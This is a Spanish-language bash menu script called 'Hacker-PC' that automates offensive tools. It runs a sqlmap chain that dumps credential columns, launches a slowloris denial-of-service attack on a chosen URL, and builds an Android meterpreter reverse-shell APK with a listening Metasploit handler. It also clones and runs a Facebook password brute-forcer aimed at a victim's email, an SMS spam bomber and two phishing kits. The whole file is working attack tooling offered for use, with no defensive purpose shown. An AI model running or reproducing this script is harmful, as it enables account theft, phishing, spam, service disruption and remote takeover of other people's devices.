#!/bin/bash

#Politica y Privicidad »»»» HACKER-PC
echo -e "---->       ESTE SCRIPT ESTA EN DESARROLLO PRONTO AGREGARE UN MENU     <----"
sleep 3
clear

function limpiar_pantalla {
    clear
}
limpiar_pantalla
while :
do
opcion=0
echo
echo
echo -e " \e[0;34m      :::    :::    :::     :::::::: :::    ::::::::::::::::::::::              :::::::::  :::::::: \e[0m"
echo -e " \e[0;34m     :+:    :+:  :+: :+:  :+:    :+::+:   :+: :+:       :+:    :+:             :+:    :+::+:    :+: \e[0m"
echo -e " \e[0;34m    +:+    +:+ +:+   +:+ +:+       +:+  +:+  +:+       +:+    +:+             +:+    +:++:+         \e[0m"
echo -e " \e[0;34m   +#++:++#+++#++:++#++:+#+       +#++:++   +#++:++#  +#++:++#: +#++:++#++:+++#++:++#+ +#+          \e[0m"
echo -e " \e[0;34m  +#+    +#++#+     +#++#+       +#+  +#+  +#+       +#+    +#+             +#+       +#+           \e[0m"
echo -e " \e[0;34m #+#    #+##+#     #+##+#    #+##+#   #+# #+#       #+#    #+#             #+#       #+#    #+#     \e[0m"
echo -e " \e[0;34m###    ######     ### ######## ###    ################    ###             ###        ########       \e[0m"
                                               

echo
echo

echo -e "  \e[0;34m 01 \e[31mNmap\e[0;34m"              " Simple comando NMAP "
echo -e "  \e[0;34m 02 \e[31mSqlmap\e[0;34m"            " SQLmap automatizado con todos los comandos puede demmorar el scan ... "
echo -e "  \e[0;34m 03 \e[31mDdoS-slowloris.pl\e[0;34m" " Pre instalado el original slowloris y pre configurado para un ataque mas potente ... "
echo -e "  \e[0;34m 04 \e[31mPayload-android\e[0;34m"   " Un solo PAYLOAD automatizado y te dejara msfconsole en modo escucha ... "
echo -e "  \e[0;34m 05 \e[31mXSSTRIKE\e[0;34m"          " XSStrike un potente scan de vulnerabilidades xss el mas completo ... "
echo -e "  \e[0;34m 06 \e[31mGross-fb\e[0;34m"          " Un script que te ayudara a  Crackear cuentas de facebook servible hasta hoy ... "
echo -e "  \e[0;34m 07 \e[31mGOOD-KILLER\e[0;34m"       " Script good-killer herramienta que envia sms-spam 1 SmS por dia ... "
echo -e "  \e[0;34m 08 \e[31mZphisher\e[0;34m"          " zphisher script profecional para phishing ... "
echo -e "  \e[0;34m 09 \e[31mAIOPhish\e[0;34m"          " aiophish un completo script para phishing ... "
echo -e "  \e[0;34m 10 \e[31mmas herramientasde hacking\e[0;34m" "Es un listado de mas herramientas alojadas esta nueva actualizacion"
echo -e "  \e[0;34m 99 \e[31m\e[5mSalir\n\e[25m"

echo -e -n "\e[32m  Ingrese un valor :> "
read opcion
case $opcion in

1)
function limpiar_pantalla {
    clear
}
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
nmap
echo "Este proseso podria tardar por el escaneo ..."
read -p "INGRESE SU IP O PAGINA WEB > " v
sudo nmap --top-ports 25 $v/24
read enterkey
;;
2)
function limpiar_pantalla {
    clear
}
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    echo "volviendo al menu "
    bash Hacker-pc.sh
}
sqlmap
echo -e "secuencia sqlmap\n"
echo
read -p "Citio web, IP > " o
sudo sqlmap -u "$o" --random-agent --current-db --level=5 --dbms=Mysql 
echo
read -p "Enter dbs > " s
sudo sqlmap -u $o --random-agent --level=5 --dbms=Mysql -D $s --tables
echo
read -p "your user > " e
sudo sqlmap -u $o --random-agent --level=5 --dbms=Mysql -D $s  -T $e --columns
echo
read -p "el pass y id dela pagina   > " pass usr
sudo sqlmap -u $o --random-agent --level=5 --dbms=Mysql -D $s  -T $e -C $pass,$usr --dump
read enterkey
;;
3)
function limpiar_pantalla {
    clear    
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    bash Hacker-pc.sh
    echo "volviendo al menu "
}


for slowloris in output
do
cd output
limpiar_pantalla
git clone https://github.com/Ogglas/Orignal-Slowloris-HTTP-DoS.git
limpiar_pantalla
chmod 777 -R Orignal-Slowloris-HTTP-DoS
cd Orignal-Slowloris-HTTP-DoS
perl slowloris.pl
echo -e "    \e[0;34m\e[5mCrack ingresa la URL a atacar\e[25m"
read url
echo -e "    \e[0;34m\e[5mPuerto\e[25m"
read p
echo -e "    \e[0;34m\e[5mTimeout\e[25m"
read t
limpiar_pantalla
echo -e "                    \e[0;34m\e[5mCAGANDONOS EN LA PUTA MADRE CRACK\e[25m "
sleep 3
perl slowloris.pl -dns $url -port $p -timeout -num $t -cache
done
read enterkey
;;
4)
function limpiar_pantalla {
    clear    
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    echo "volviendo al menu "
    bash Hacker-pc.sh
}
echo -e "\e[0;31m___________________________\e[0;34m___________________________________\e[0m"
echo -e "\e[0;31m ██╗  ██╗  █████╗  ██████╗ \e[0;34m  ██╗ ██ ║  ███████╗  ██████╗      \e[0m"
echo -e "\e[0;31m ██║  ██║ ██╔══██╗ ██╔════╝\e[0;34m  ██║ ██╔╝  ██╔════╝  ██╔══██╗     \e[0m"
echo -e "\e[0;31m ███████║ ███████║ ██║Anoni\e[0;34mmo█████╔╝   █████╗    ██████╔╝     \e[0m"
echo -e "\e[0;31m ██╔══██║ ██╔══██║ ██║     \e[0;34m  ██╔═██╗   ██╔══╝    ██╔══██╗     \e[0m"
echo -e "\e[0;31m ██║  ██║ ██║  ██║╚██████╗ \e[0;34m  ██║ ██╗   ███████╗  ██║  ██║     \e[0m"
echo -e "\e[0;31m ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝ \e[0;34m  ╚═╝ ╚═╝   ╚══════╝  ╚═   ╚═╝     \e[0m"
echo -e "\e[0;31m                           \e[0;34m                                   \e[0m"
echo -e "\e[0;31m                      A n o\e[0;34m n i m o                           \e[0m"

echo -e "\e[3;34mDERECHOS-DE-AUTOR->>>\e[0;31mHACKER-PC\e[0m"
sleep 2s
echo -e "\e[1;31mVAMOS-A-CREAR-UN-PAYLOAD-ANDROID ... \e[0m"
sleep 3s
echo -n -e "\e[0;31mDIRECCION-IP\e[0m"
read ip
echo -n -e "\e[0;31mPUERTO\e[0m"
read puerto
read -p "\e[0;31mNombre de la aplicacion :" o
limpiar_pantalla
echo -e "\e[3;33mcreando aplicacion \e[0m"
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $o.apk
echo -e "\e[1;33mCreado con-\e[0m-\e[0;31m-EXITO\e[0m"
sleep 2s
echo -e "\e[0;34mConectando a postgresql\e[0m"
sudo service postgresql start
echo -e "\e[0;34mConectado con exito\e[0m"
sleep 2s
echo -e "\e[0;31mABRIENDO METASPLOIT\e[0m"
sleep 2s
limpiar_pantalla
msfconsole -x "use multi/handler;\
set PAYLOAD android/meterpreter/reverse_tcp;\
set LHOST $ip;\
set LPORT $puerto;\
exploit"
read enterkey
;;
5)
function limpiar {
    clear
}
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    echo "volviendo al menu "
    bash Hacker-pc.sh
}

for XSStrike in output
do
function limpiar_pantalla {
    clear
}
cd output
limpiar_pantalla
git clone https://github.com/s0md3v/XSStrike.git
chmod 777 -R XSStrike
limpiar_pantalla
cd XSStrike
python3 xsstrike.py
echo -e "comandos a agregar para el escaneo " URL
read url
python3 xsstrike.py $URL
done
read enterkey
;;
6)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    echo "volviendo al menu "
}
for Grossfb in output
do
function limpiar_pantalla {
    clear
}
cd output
limpiar_pantalla
git clone https://github.com/Antraxmx/Gross-FB.git
chmod 777 -R Gross-FB
limpiar_pantalla
cd Gross-FB
limpiar_pantalla
echo -e "   \e[0;31m\e[5mCrackPress enter \e[0m"
echo -e "  \e[0;34mIngresa correo dela victima"
read c
echo -e "  \e[0;34mIngresa ruta de tu diccionario"
read d
perl gross.pl $c $d
done
read enterkey
;;
7)
function limpiar_pantalla {
    clear    
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    bash Hacker-pc.sh
    echo "volviendo al menu "
}


for Goodkiller in output
do
cd output
limpiar_pantalla
git clone https://github.com/FDX100/GOD-KILLER.git
chmod 777 -R GOD-KILLER
limpiar_pantalla
cd GOD-KILLER
chmod 777 -R install.py
python install.py "
y"
GOD-KILLER
done
read enterkey
;;
8)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
for Zphisher in output
do
function limpiar_pantalla {
    clear
}
cd output
printf " INICIANDO INSTALACION DE REQUERIMENTOS " "                                                                                                   "
apt install git curl php wget -y
printf "INSTALADAS CON EXITO"
limpiar_pantalla
git clone git://github.com/htr-tech/zphisher.git
chmod 777 -R zphisher
limpiar_pantalla
cd zphisher
bash zphisher.sh
done
read enterkey
;;
9)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
for AIOPhish in output
do
function limpiar_pantalla {
    clear
}

cd output
limpiar_pantalla
git clone https://github.com/DeepSociety/AIOPhish
chmod 777 -R AIOPhish
limpiar_pantalla
cd AIOPhish
./aiophish
done
read enterkey
;;
10)

function hackingtool-pc {
    cd HCK
    bash HCK.sh
}
hackingtool-pc

read enterkey
;;
99)
clear
exit 0
read enterkey
;;
*) echo "la opcion no esta e n la lista"
read enterkey
;;
esac
done
